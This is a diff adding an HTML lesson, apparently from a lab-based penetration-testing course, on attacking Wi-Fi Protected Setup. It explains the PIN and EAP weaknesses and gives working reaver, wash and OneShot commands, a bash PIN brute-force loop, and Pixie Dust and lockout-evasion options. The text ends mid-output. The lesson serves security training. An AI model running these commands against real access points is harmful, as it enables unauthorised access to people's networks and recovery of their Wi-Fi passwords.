@@ -1,0 +1,1447 @@
+<html><head></head><body><p>
+  </p><div class="container"><p></p>
+<link rel="stylesheet" href="modules\style.css">
+
+
+<h1 id="attacking-wi-fi-protected-setup-wps-">Attacking Wi-Fi Protected Setup (WPS)</h1>
+<h2 id="wps-reconnaissance">WPS Reconnaissance</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>airmon-ng start wlan0</code></td>
+<td>Enable Monitor Mode.</td>
+</tr>
+<tr>
+<td><code>airodump-ng --wps wlan0mon</code></td>
+<td>Enumerate available Wi-Fi networks with WPS using airodump-ng.</td>
+</tr>
+<tr>
+<td><code>wash -i wlan0mon</code></td>
+<td>Enumerate available Wi-Fi networks with WPS using wash.</td>
+</tr>
+<tr>
+<td><code>wash -j -i wlan0mon</code></td>
+<td>Enumerate available Wi-Fi networks with WPS using wash with verbose output.</td>
+</tr>
+<tr>
+<td><code>grep -i "84-1B-5E" /var/lib/ieee-data/oui.txt</code></td>
+<td>Vendor lookup using BSSID.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="online-pin-brute-forcing-attacks">Online PIN Brute-Forcing Attacks</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><p><code>iw dev wlan0 interface add mon0 type monitor</code><br><code>ifconfig mon0 up</code></p></td>
+<td>Add new monitor mode interface.</td>
+</tr>
+<tr>
+<td><code>reaver -i mon0 -b AE:EB:B0:11:A0:1E -c 1</code></td>
+<td>WPS PIN Bruteforce using reaver.</td>
+</tr>
+<tr>
+<td><code>reaver -i mon0 -b B2:A5:1D:E1:B2:11 -c 1 -p 1234</code></td>
+<td>WPS PIN Bruteforce using half known PIN.</td>
+</tr>
+<tr>
+<td><code>reaver -b 5A:1A:59:B7:E7:97 -c 1 -i mon0 -p " "</code></td>
+<td>WPS Null PIN Authentication.</td>
+</tr>
+<tr>
+<td><code>sudo reaver -i mon0 -b 60:38:E0:2A:4F:21 -p 88766197</code></td>
+<td>Retrieve WPA-PSK using a Known PIN.</td>
+</tr>
+<tr>
+<td><code>wpspin -A 60:38:E0:A2:3D:2A</code></td>
+<td>WPS pin generation using BSSID.</td>
+</tr>
+<tr>
+<td><p><code>#!/bin/bash</code><br><code>PINS='73834410 94229882 73834410'</code><br><code>for PIN in $PINS</code><br><code>do</code><br>   <code>echo Attempting PIN: $PIN</code><br>   <code>sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 60:38:E0:A2:3D:2A -c 1 -p $PIN</code><br><code>done</code><br><code>echo "PIN Guesses Complete"</code></p></td>
+<td>Bash script to Bruteforce WPS pins using a PIN list.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="offline-pin-brute-forcing-attacks">Offline PIN Brute Forcing Attacks</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>reaver -K 1 -vvv -b 86:FC:9F:5D:67:4E -c 1 -i mon0</code></td>
+<td>Perform Pixie Dust attack using Reaver.</td>
+</tr>
+<tr>
+<td><code>python3 oneshot.py -b 86:FC:9F:5D:67:4E -i wlan0mon -K</code></td>
+<td>Perform Pixie Dust attack using OneShot.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="misc-wps-attacks">Misc WPS Attacks</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>wpa_cli scan_results</code></td>
+<td>Scan for available WiFi networks.</td>
+</tr>
+<tr>
+<td><code>wpa_cli wps_pbc D8:D6:3D:EB:29:D5</code></td>
+<td>Connect to WPS wifi network using wpa_cli with PBC method.</td>
+</tr>
+<tr>
+<td><code>python3 /opt/OneShot/oneshot.py -i wlan0mon --pbc</code></td>
+<td>Connect to WPS wifi network using OneShot with PBC method.</td>
+</tr>
+<tr>
+<td><code>sudo reaver -l 100 -r 3:45 -i wlan0mon -b 60:38:E0:XX:XX:XX</code></td>
+<td>Bruteforce WPS PIN using reaver with lock delay of 100 seconds and sleep for 45 seconds every 3 pin attempts</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="wi-fi-protected-setup-overview">Wi-Fi Protected Setup Overview</h2>
+<hr>
+<p>WPS was originally developed by Cisco in 2006 as a method to enable convenience and ease of use for users with little knowledge. Either through the push of a button or entering of a PIN users are able to easily connect their devices to their wireless network. Since then, multiple different exploitation tools have been developed with the intent to abuse the PIN. WPS PINs are eight digits in length, making them significantly easier to crack compared to traditional WPA methods.</p>
+<p>Although convenient, WPS is susceptible to online PIN cracking and offline PIN cracking methods. WPS utilizes a series of EAP messages exchanged between a station (enrollee) and an access point (registrar). During this process, valuable information is disclosed; information that can be exploited for these attack methods. While traditional online PIN cracking takes hours to complete, offline PIN cracking can be as quick as a few minutes when the access point is vulnerable.</p>
+<p>WPS utilizes HMAC-SHA-256, which is considered a fairly secure hashing function. However, due to the lack of possible PIN combinations, randomness in nonce values, and information disclosed in the communications between the access point and the client, we are able to crack these PINs relatively quickly and retrieve the PSK for normal WPA communications.</p>
+<p>When assessing wireless access points, it is always important to check for WPS vulnerabilities. As such, possessing the skills to test for WPS-related vectors is crucial for all wireless penetration testers.</p>
+<hr>
+<h4 id="wps-connection-methods">WPS Connection Methods</h4>
+<p>There are four methods to connect to a WPS-enabled access point. Each of them is detailed below:</p>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Push Button Configuration (PBC)</code></td>
+<td>This is the most common method and involves pressing a physical or virtual button on the router and the client device. Once the button is pressed on both devices, they automatically exchange the necessary information to establish a secure connection.</td>
+</tr>
+<tr>
+<td><code>PIN Entry</code></td>
+<td>Each WPS-enabled device has an 8-digit PIN code, either provided by the manufacturer or displayed on the device. Users enter this PIN on their router or access point’s configuration page to connect the device to the network.</td>
+</tr>
+<tr>
+<td><code>Near-field communication method</code></td>
+<td>Some devices support NFC, allowing users to tap the device on the router to establish a connection. This method is less common but offers an additional level of convenience.</td>
+</tr>
+<tr>
+<td><code>USB Flash Drive</code></td>
+<td>Involves transferring configuration settings via a USB drive from the router to the client device. This method is rarely used due to the inconvenience compared to other methods.</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h4 id="benefits-of-wps">Benefits of WPS</h4>
+<ul>
+<li><code>Ease of Use</code>: Simplifies the process of adding new devices to a wireless network, making it accessible even for non-technical users.</li>
+<li><code>Convenience</code>: Eliminates the need to remember or enter long and complex passwords.</li>
+</ul>
+<hr>
+<h4 id="security-concerns">Security Concerns</h4>
+<p>While WPS was designed to make network connections simpler, it has notable security vulnerabilities:</p>
+<ul>
+<li><code>PIN Method Vulnerability</code>: The 8-digit PIN can be cracked relatively easily through brute-force attacks due to the way the protocol verifies the PIN in two halves.</li>
+<li><code>Physical Security Risks</code>: The PBC method relies on physical security, meaning an unauthorized person within range could potentially push the button and connect to the network.</li>
+</ul>
+<p>Wi-Fi Protected Setup provides an easy way to connect devices to a Wi-Fi network, but it comes with significant security risks, especially with the PIN method. Understanding these risks and taking steps to mitigate them, such as disabling WPS and using robust security protocols, can help protect your network.</p>
+<p>Note: After spawning, please wait <code>3</code>-<code>4</code> minutes before connecting to the target(s).</p>
+<hr>
+<h2 id="how-wps-works">How WPS Works</h2>
+<hr>
+<p>WPS works by establishing authentication through a series of <a href="https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol">Extensible Authentication Protocol (EAP)</a> messages. Some of the information communicated includes Public Keys, PINs, and nonce values. Essentially, after some checks and balances between the access point and the connected client, the access point (registrar) shares the WPA pre-shared key, which allows the connected client (enrollee) to ensure communications as normal with WPA. It should also be noted that when WPS (Wi-Fi Protected Setup) is used to configure an access point, the roles of the access point (AP) and the client device can switch. In this case, the AP may act as the Enrollee, while the client device assumes the role of the Registrar, which is responsible for <a href="https://android.googlesource.com/platform/external/wpa_supplicant_8/+/master/wpa_supplicant/README-WPS#36">configuring the AP</a>.</p>
+<p>There are several methods for WPS to begin the series of EAP messages. Commonly these are through the PIN method initiated by the client, and the push button method initiated manually on the access point. There are other methods as well such as the Near-field communication method through the usage of RFID among many other WPS-related technologies.</p>
+<hr>
+<h4 id="wps-pin-anatomy">WPS PIN Anatomy</h4>
+<p>The WPS PIN is eight digits in length and consists of two primary portions. The first portion is used in the M4 and M5 EAP messages, and the second portion is used in the M6 and M7 EAP messages. Each of these portions is four digits in length. Most would assume that there would be 100,000,000 (10<sup>8</sup>) possible digit combinations, but in the case of WPS, this is not true. There are only 11,000 possible combinations.</p>
+<p><img src="storage\modules\186\WPSAlgorithm\PIN\WPS_PIN.png" alt="Table with two sections: First Half showing 1023, Second Half showing 987 and 5."></p>
+<p>This is due to how the PIN functions. The first half only has 10<sup>4</sup> possible combinations and the second half has only 10<sup>3</sup> possible combinations. The last digit of the second half is used as a checksum and can be easily calculated. Therefore, there are only 10,000 (10<sup>4</sup>) + 1,000(10<sup>3</sup>) possible digit combinations, which is 11,000 total combinations.</p>
+<hr>
+<h4 id="wps-eap-messages">WPS EAP Messages</h4>
+<p>Before describing the series of EAP messages, the following definitions will come in handy.</p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>Definition</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>PKe</code></td>
+<td>This is the Enrollee's (Access Point's) Diffie-Hellman public key.</td>
+</tr>
+<tr>
+<td><code>PKr</code></td>
+<td>This is the Registrar's (Station's/Client's) Diffie-Hellman public key.</td>
+</tr>
+<tr>
+<td><code>PSK1</code></td>
+<td>First four-digit portion of the PIN (10,000 possible combinations).</td>
+</tr>
+<tr>
+<td><code>PSK2</code></td>
+<td>Second four-digit portion of the PIN (1,000 possible combinations). The last digit is used as the checksum.</td>
+</tr>
+<tr>
+<td><code>KDK (Key Derivation Key)</code></td>
+<td>This is a key used in derivation for the auth key.</td>
+</tr>
+<tr>
+<td><code>KWK (Key Wrap Key)</code></td>
+<td>Used in the process of encrypting messages with AES.</td>
+</tr>
+<tr>
+<td><code>E-S1</code></td>
+<td>This is a secret 128-bit enrollee (AP) nonce value used in derivation for E-Hash1.</td>
+</tr>
+<tr>
+<td><code>E-S2</code></td>
+<td>This is a secret 128-bit enrollee (AP) nonce value used in derivation for E-Hash2.</td>
+</tr>
+<tr>
+<td><code>R-S1</code></td>
+<td>This is a secret 128-bit registrar (client/station) nonce value used in derivation for R-Hash1.</td>
+</tr>
+<tr>
+<td><code>R-S2</code></td>
+<td>This is a secret 128-bit registrar (client/station) nonce value used in derivation for R-Hash2.</td>
+</tr>
+<tr>
+<td><code>E-Hash1 (Enrollee Hash1)</code></td>
+<td>Comprised of the E-S1 nonce value, PSK1, PKe, and PKr values. Created through the HMAC-SHA-256 hashing function using the Auth Key.</td>
+</tr>
+<tr>
+<td><code>E-Hash2 (Enrollee Hash2)</code></td>
+<td>Comprised of the E-S2 nonce value, PSK2, PKe, and PKr values. Created through the HMAC-SHA-256 hashing function using the Auth Key.</td>
+</tr>
+<tr>
+<td><code>R-Hash1 (Registrar Hash1)</code></td>
+<td>Comprised of the R-S1 nonce value, PSK1, PKe, and PKr values. Created through the HMAC-SHA-256 hashing function using the Auth Key.</td>
+</tr>
+<tr>
+<td><code>R-Hash2 (Registrar Hash2)</code></td>
+<td>Comprised of the R-S2 nonce value, PSK2, PKe, and PKr values. Created through the HMAC-SHA-256 hashing function using the Auth Key.</td>
+</tr>
+<tr>
+<td><code>Auth Key</code></td>
+<td>Derived from the KDK, PSK1, and PSK2 values.</td>
+</tr>
+<tr>
+<td><code>WPA-PSK</code></td>
+<td>This is the final disclosed pre-shared key (aka password) used to authenticate the client.</td>
+</tr>
+</tbody>
+</table>
+<p>The series of EAP messages from a high level looks like the following:</p>
+<p><img src="storage\modules\186\WPSAlgorithm\EAPSeries\WPS_EAP.png" alt="Diagram of EAPOL communication between Access Point (Enrollee) and Station (Registrar) showing steps: EAPOL-Start, EAP Request Identify, EAP Response Identity, EAP Requests and Responses M1 to M8 with credentials, EAP NACK, and EAP Acknowledgement."></p>
+<p>Each of these messages is responsible for disclosing different information, and they conduct the following.</p>
+<table>
+<thead>
+<tr>
+<th>Message</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>EAPOL-Start</code></td>
+<td>The connected client initiates the series of EAP messages.</td>
+</tr>
+<tr>
+<td><code>EAP Request Identity</code></td>
+<td>The access point requests the connected client's identity.</td>
+</tr>
+<tr>
+<td><code>EAP Response Identity</code></td>
+<td>The client sends the access point its identity as requested.</td>
+</tr>
+<tr>
+<td><code>EAP M1 Message</code></td>
+<td>The access point sends the client their Diffie-Hellman public key (PKe).</td>
+</tr>
+<tr>
+<td><code>EAP M2 Message</code></td>
+<td>The client then sends the Access point the their Diffie-Hellman public key (PKr).</td>
+</tr>
+<tr>
+<td><code>EAP M3 Message</code></td>
+<td>The access point sends the client the E-Hash1 and E-Hash2 values.</td>
+</tr>
+<tr>
+<td><code>EAP M4 Message</code></td>
+<td>The client then sends the access point the R-Hash1, R-Hash2, and R-S1 nonce value encrypted with AES.</td>
+</tr>
+<tr>
+<td><code>EAP M5 Message</code></td>
+<td>The access point sends the client the E-S1 nonce value encrypted with AES.</td>
+</tr>
+<tr>
+<td><code>EAP M6 Message</code></td>
+<td>The client sends the access point the R-S2 nonce value encrypted with AES.</td>
+</tr>
+<tr>
+<td><code>EAP M7 Message</code></td>
+<td>If the PIN is correct, the access point sends the client the E-S2 value and the WPA-PSK encrypted with AES.</td>
+</tr>
+<tr>
+<td><code>EAP M8 Message</code></td>
+<td>The client then sends the WPA-PSK back to the access point to begin the WPA handshake process.</td>
+</tr>
+</tbody>
+</table>
+<p>These EAP messages are simple yet somewhat complex. Fortunately for us, two different cracking methods can be employed to guess the correct PIN (through all 11,000 possible combinations) and retrieve the final WPA-PSK. These methods are online brute-forcing and offline brute-forcing, also known as the Pixie Dust Attack. In the following sections, we will be focusing on reconnaissance, both cracking methods, and additional PIN generation algorithms.</p>
+<hr>
+<h2 id="wps-reconnaissance">WPS Reconnaissance</h2>
+<hr>
+<p>In order to analyze a target network, we need to view its WPS information. We can do so with several different tools. Some of the information we hope to attain is the MAC address of the access point and which WPS version it is using. The MAC address is useful because an easy vendor lookup may allow us to find that the access point's vendor may or may not be susceptible to different kinds of WPS attacks. This can easily be done with a bit of research, and later we will explore custom PIN generation based on this information. Additionally, we want to find which version of WPS is running, along with which mode it is in, as it will help us narrow down which attack techniques to employ. If an access point is running WPS version 2.0 it is unlikely that we will be able to use any vector beyond pixie dust attacks, possibly null pin attacks, and brute forcing attempts with very long reattempt periods. This is due to a few factors, such as a locking feature built into most access points. After a certain amount of incorrectly guessed PINs the access point locks and requires either a reboot or timeout for additional PIN guesses.</p>
+<p> Note: All the commands shown in this module should be run as root. Use 'sudo -s' to switch to the root user.</p>
+<hr>
+<h4 id="scanning-wps-networks-with-airodump-ng">Scanning WPS Networks with Airodump-ng</h4>
+<p>First we need to list our available wireless interfaces.</p>
+<p>  WPS Reconnaissance</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+lo        no wireless extensions.
+
+eth0      no wireless extensions.
+
+wlan0     IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">ESSID:</span>off/any  
+<span class="hljs-symbol">          Mode:</span>Managed  Access <span class="hljs-string">Point:</span> Not-Associated   Tx-Power=<span class="hljs-number">20</span> dBm   
+          Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Encryption <span class="hljs-string">key:</span>off
+          Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<p>Then at this point we need to enable monitor mode for our interface.</p>
+<p>  WPS Reconnaissance</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">rootlrahmanTamim</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ airmon-ng start wlan0
+</code></pre>
+<p>To begin searching for networks with WPS we employ the following command. We specify <code>--wps</code> to display WPS information and <code>--ignore-negative-one</code> to remove -1 PWR error messages.</p>
+<p>  WPS Reconnaissance</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ airodump-ng --wps --ignore-negative-one wlan0mon
+
+BSSID              PWR  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID</span>
+XX:XX:XX:XX:XX:XX  -43       <span class="hljs-number"> 1 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 6 </span><span class="hljs-number"> 195 </span>  WPA2 CCMP   PSK  2.0 LAB   FakeNetwork
+XX:XX:XX:XX:XX:XX  -43       <span class="hljs-number"> 1 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 6 </span><span class="hljs-number"> 195 </span>  WPA2 CCMP   PSK  1.0 USB   FakeNetwork
+XX:XX:XX:XX:XX:XX  -43       <span class="hljs-number"> 1 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 6 </span><span class="hljs-number"> 195 </span>  WPA2 CCMP   PSK  1.0 DISP  FakeNetwork
+XX:XX:XX:XX:XX:XX  -43       <span class="hljs-number"> 1 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 6 </span><span class="hljs-number"> 195 </span>  WPA2 CCMP   PSK  1.0 PBC   FakeNetwork
+XX:XX:XX:XX:XX:XX  -43       <span class="hljs-number"> 1 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 6 </span><span class="hljs-number"> 195 </span>  WPA2 CCMP   PSK  2.0 PBC   FakeNetwork
+60:38:E0:XX:XX:XX   -7  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 24 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 8 </span><span class="hljs-number"> 130 </span>  WPA2 CCMP   PSK  1.0 LAB   HTB-Wireless
+</code></pre>
+<p>We could also narrow down our scan further to just our network in question with the following command. We specify the channel with <code>-c</code> and the AP MAC with <code>--bssid</code>.</p>
+<p>  WPS Reconnaissance</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ airodump-ng --wps --ignore-negative-one -c <span class="hljs-number">8</span> --bssid <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span>XX wlan0mon
+</code></pre>
+<p>With Airodump-ng, we can obtain solid information about the WPS version and the mode it is using to operate. WPS includes several different modes, and Airodump-ng uses the following acronyms to represent them.</p>
+<table>
+<thead>
+<tr>
+<th>Acronym</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>DISP</code></td>
+<td>The Access Point generates a PIN in its administrative setup portal, and the PIN can be found there.</td>
+</tr>
+<tr>
+<td><code>ETHER</code></td>
+<td>A rare mode that allows enrollees and registrars to undergo setup over Ethernet.</td>
+</tr>
+<tr>
+<td><code>EXTNFC</code></td>
+<td>WPS using Near Field Communication.</td>
+</tr>
+<tr>
+<td><code>INTNFC</code></td>
+<td>WPS using Near Field Communication.</td>
+</tr>
+<tr>
+<td><code>KPAD</code></td>
+<td>Keypad PIN method configuration. Enrollees connect by entering the WPS PIN into a keypad on the client device.</td>
+</tr>
+<tr>
+<td><code>LAB</code></td>
+<td>The PIN is displayed on a label attached to the access point itself.</td>
+</tr>
+<tr>
+<td><code>Locked</code></td>
+<td>WPS is locked. This can occur from too many incorrect guesses.</td>
+</tr>
+<tr>
+<td><code>NFCINTF</code></td>
+<td>WPS using Near Field Communication.</td>
+</tr>
+<tr>
+<td><code>PBC</code></td>
+<td>Push Button Configuration. Allows clients to join by pressing the WPS button on both the access point and the client device.</td>
+</tr>
+<tr>
+<td><code>USB</code></td>
+<td>Data is transferred between the access point and the client through a USB interface.</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h4 id="scanning-wps-networks-with-wash">Scanning WPS Networks with Wash</h4>
+<p>Wash is another great tool for scanning networks with WPS. We can employ a simple command with wash to display all networks with WPS and their respective versions.</p>
+<p>  WPS Reconnaissance</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ wash -i wlan0mon
+
+BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
+--------------------------------------------------------------------------------
+<span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span>XX    <span class="hljs-number">3</span>  <span class="hljs-number">-07</span>  <span class="hljs-number">1.0</span>  No   AtherosC  HTB-Wireless
+<span class="hljs-string">XX:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span>XX    <span class="hljs-number">1</span>  <span class="hljs-number">-63</span>  <span class="hljs-number">2.0</span>  No   LantiqML  FakeNetwork
+<span class="hljs-string">XX:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span>XX    <span class="hljs-number">1</span>  <span class="hljs-number">-63</span>  <span class="hljs-number">2.0</span>  No   Quantenn  FakeNetwork
+<span class="hljs-string">XX:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span>XX    <span class="hljs-number">1</span>  <span class="hljs-number">-61</span>  <span class="hljs-number">2.0</span>  No   AtherosC  FakeNetwork
+</code></pre>
+<p>We can display much more verbose output with wash using the following command.</p>
+<p>  WPS Reconnaissance</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ wash -j -<span class="hljs-selector-tag">i</span> wlan0mon
+
+{<span class="hljs-string">"bssid"</span> : <span class="hljs-string">"XX:XX:XX:XX:XX:XX"</span>, <span class="hljs-string">"essid"</span> : <span class="hljs-string">"FakeNetwork"</span>, <span class="hljs-string">"channel"</span> : <span class="hljs-number">1</span>, <span class="hljs-string">"rssi"</span> : -<span class="hljs-number">61</span>, <span class="hljs-string">"wps_version"</span> : <span class="hljs-number">32</span>, <span class="hljs-string">"wps_state"</span> : <span class="hljs-number">2</span>, <span class="hljs-string">"wps_locked"</span> : <span class="hljs-number">2</span>, <span class="hljs-string">"wps_response_type"</span> : <span class="hljs-string">"03"</span>, <span class="hljs-string">"wps_config_methods"</span> : <span class="hljs-string">"0000"</span>, <span class="hljs-string">"wps_rf_bands"</span> : <span class="hljs-string">"03"</span>, }
+{<span class="hljs-string">"bssid"</span> : <span class="hljs-string">"XX:XX:XX:XX:XX:XX"</span>, <span class="hljs-string">"essid"</span> : <span class="hljs-string">"FakeNetwork"</span>, <span class="hljs-string">"channel"</span> : <span class="hljs-number">1</span>, <span class="hljs-string">"rssi"</span> : -<span class="hljs-number">61</span>, <span class="hljs-string">"wps_version"</span> : <span class="hljs-number">32</span>, <span class="hljs-string">"wps_state"</span> : <span class="hljs-number">2</span>, <span class="hljs-string">"wps_locked"</span> : <span class="hljs-number">2</span>, <span class="hljs-string">"wps_response_type"</span> : <span class="hljs-string">"03"</span>, <span class="hljs-string">"wps_config_methods"</span> : <span class="hljs-string">"0000"</span>, <span class="hljs-string">"wps_rf_bands"</span> : <span class="hljs-string">"03"</span>, }
+</code></pre>
+<p>It is important to check the <code>wps_locked</code> status from wash. If it is set to 2, it means WPS is not in a locked state. Additionally, we can find out which vendor is associated with the access point with the following command, specifying the beginning of the MAC address.</p>
+<p>  WPS Reconnaissance</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ grep -<span class="hljs-selector-tag">i</span> <span class="hljs-string">"84-1B-5E"</span> /var/lib/ieee-data/oui<span class="hljs-selector-class">.txt</span>
+
+<span class="hljs-number">84</span>-<span class="hljs-number">1</span>B-<span class="hljs-number">5</span>E   (hex)                NETGEAR
+</code></pre>
+<p><strong>Things to be wary of when testing WPS</strong></p>
+<p>When attempting to test WPS, we want to note the following conditions:</p>
+<ul>
+<li><code>The WPS version</code>.</li>
+<li><code>wps_locked status</code>: We want to ensure that clients can join the network.</li>
+<li><code>The WPS Mode</code>: If we need to press a button to join the network, chances are we are not cracking the PIN this way.</li>
+<li><code>Max PIN Attempts Locking</code>: If the access point locks after a few incorrectly guessed PINs, we likely will not be able to get through all 11,000 possible combinations.</li>
+</ul>
+<hr>
+<h3 id="moving-on">Moving On</h3>
+<p>In this section, we explored how to use <code>airodump-ng</code> and <code>wash</code> to perform reconnaissance on WPS networks. In the next section, we will examine bruteforcing the identified WPS Wi-Fi networks. Assuming a target access point meets the criteria for testing WPS, we could attempt offline or online PIN cracking to retrieve the WPA-PSK. The following sections will delve into how to conduct both online and offline PIN cracking attempts.</p>
+<hr>
+<h2 id="online-pin-brute-forcing-overview">Online PIN Brute-Forcing Overview</h2>
+<hr>
+<p>One of the ways that we can attempt to retrieve the correct WPS pin for a target network is through online PIN brute-forcing. This can be conducted with a few different tools, but popularly it is done with either Reaver or Bully.</p>
+<p><img src="storage\modules\186\BruteForcing\Online\WPS_BRUTE.png" alt="Diagram showing WPA-PSK communication between Attacker and Access Point. Attacker attempts with sequences 0000001, 0000002, and succeeds with 0000003."></p>
+<p>Online brute-forcing works by trying all possible digit combinations and sending them to the access point for verification. By doing this, we go through the series of EAP messages for each possible PIN. In the M4 message, the client sends the access point the R-Hash1 and R-Hash2 values, along with the R-S1 nonce values encrypted with AES. During this message, the access point computes the received R-Hash1 and R-Hash2 values to verify if the PIN we sent is correct. If it is, the remaining messages are exchanged. If it is not, we receive a NACK.</p>
+<p>In online brute-forcing attacks, we already know some values and generate others. These are as follows:</p>
+<ul>
+<li>We know the PKe and generate the PKr ourselves. This allows us to generate the proper response for the R-Hash1 and R-Hash2 values.</li>
+<li>We generate the R-S1 and R-S2 nonce values ourselves.</li>
+<li>We receive the E-Hash1 and E-Hash2 values from the access point during the M3 message.</li>
+</ul>
+<p>However, during these attacks we do not know:</p>
+<ul>
+<li>The true PIN (PSK1 and PSK2 values). We guess this through the 11,000 combinations.</li>
+<li>The E-S1 and E-S2 nonce values. We receive these from the access point in the M5 and M7 message. Of course, only if we guess the PIN correctly.</li>
+<li>The WPA-PSK. This is the resulting success during the M7 message upon guessing the correct PIN.</li>
+</ul>
+<p>Due to us not knowing either of the 128-bit E-S1 and E-S2 nonce values, and the fact that they are random, we are left guessing the PIN. However, these are not always randomly generated. Depending on the vendor, we might be able to employ the usage of an offline pixie dust attack to retrieve the WPA-PSK.</p>
+<hr>
+<h2 id="online-pin-brute-forcing-using-reaver">Online PIN Brute-Forcing Using Reaver</h2>
+<hr>
+<p><a href="https://github.com/t6x/reaver-wps-fork-t6x">Reaver</a> is an excellent tool for conducting online password cracking attempts. It offers various options, including Null PIN attacks, custom PIN associations, Pixie Dust Attacks, and general brute-forcing. We will explore Pixie Dust Attacks in detail in the later section. In this section, we will focus on brute-forcing WPS PINs using reaver.</p>
+<h4 id="reaver-usage">Reaver Usage</h4>
+<p>Code: usage</p>
+<pre><code class="lang-usage">reaver -<span class="hljs-selector-tag">i</span> [interface] -<span class="hljs-selector-tag">b</span> [BSSID] -c [channel]
+</code></pre>
+<table>
+<thead>
+<tr>
+<th><strong>Option</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-i</code></td>
+<td>Name of the monitor-mode interface to use</td>
+</tr>
+<tr>
+<td><code>-b</code></td>
+<td>BSSID of the target AP</td>
+</tr>
+<tr>
+<td><code>-c</code></td>
+<td>Set the 802.11 channel for the interface</td>
+</tr>
+<tr>
+<td><code>-p</code></td>
+<td>Use the specified pin</td>
+</tr>
+<tr>
+<td><code>-d</code></td>
+<td>Set the delay between pin attempts</td>
+</tr>
+<tr>
+<td><code>-l</code></td>
+<td>Set the time to wait if the AP locks WPS pin attempts</td>
+</tr>
+<tr>
+<td><code>-g</code></td>
+<td>Quit after num pin attempts</td>
+</tr>
+<tr>
+<td><code>-r</code></td>
+<td>Sleep for y seconds every x pin attempts</td>
+</tr>
+<tr>
+<td><code>-t</code></td>
+<td>Set the receive timeout period</td>
+</tr>
+<tr>
+<td><code>-L</code></td>
+<td>Ignore locked state reported by the target AP</td>
+</tr>
+<tr>
+<td><code>-K, -Z</code></td>
+<td>Run pixiedust attack</td>
+</tr>
+<tr>
+<td><code>-O</code></td>
+<td>Write packets of interest into pcap file</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h4 id="brute-forcing-wps-pin">Brute-forcing WPS PIN</h4>
+<p>To begin, we need to enable monitor mode. We can use the <code>iw</code> command to add a new interface named <code>mon0</code> and set its type to monitor mode, as demonstrated below. Due to a known bug, setting the interface to monitor mode using <code>airmon-ng</code> can cause <code>Reaver</code> to malfunction. Therefore, it is recommended to use the <code>iw</code> command for this purpose.</p>
+<p>  Online PIN Brute-Forcing Using Reaver</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ iw dev wlan0 interface add mon0 type monitor
+
+rootlrahmanTamim@htb[/htb]$ ifconfig mon0 up
+
+rootlrahmanTamim@htb[/htb]$ iwconfig
+
+lo        <span class="hljs-literal">no</span> wireless extensions.
+
+eth0      <span class="hljs-literal">no</span> wireless extensions.
+
